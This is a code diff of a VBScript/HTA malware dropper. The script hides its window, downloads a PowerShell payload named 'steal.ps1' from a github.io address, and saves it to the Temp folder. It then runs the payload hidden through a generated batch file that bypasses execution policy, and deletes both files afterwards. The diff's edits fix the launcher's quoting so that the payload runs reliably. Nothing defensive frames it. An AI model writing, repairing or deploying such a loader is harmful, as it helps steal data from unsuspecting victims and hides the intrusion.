@@ -5,31 +5,37 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, xh, ps1Content
+Dim sh, fso, xh, ps1Content, batPath, psPath
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 1. Download steal.ps1 from your GitHub
+' 1. Download steal.ps1
 xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
 If xh.Status = 200 Then
     ps1Content = xh.responseText
-    Set xh = Nothing
-
-    ' 2. Save steal.ps1 to temp
-    Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
-    Dim f : Set f = fso.CreateTextFile(tempPs1, True)
+    
+    ' 2. Save steal.ps1 to Temp
+    psPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
+    Dim f : Set f = fso.CreateTextFile(psPath, True)
     f.Write ps1Content
     f.Close
 
-    ' 3. Run PowerShell and WAIT (True) - FIXED QUOTES
-    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
-    sh.Run finalCmd, 0, True
+    ' 3. Create a .bat file to execute it (Bypasses VBScript quote issues)
+    batPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\run.bat"
+    Dim b : Set b = fso.CreateTextFile(batPath, True)
+    b.WriteLine "@echo off"
+    b.WriteLine "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psPath & """"
+    b.Close
+
+    ' 4. Run the .bat file hidden and wait for it to finish
+    sh.Run "cmd.exe /c """ & batPath & """", 0, True
     
-    ' 4. Cleanup
-    fso.DeleteFile tempPs1, True
+    ' 5. Cleanup
+    fso.DeleteFile batPath, True
+    fso.DeleteFile psPath, True
 End If
 
 window.close()
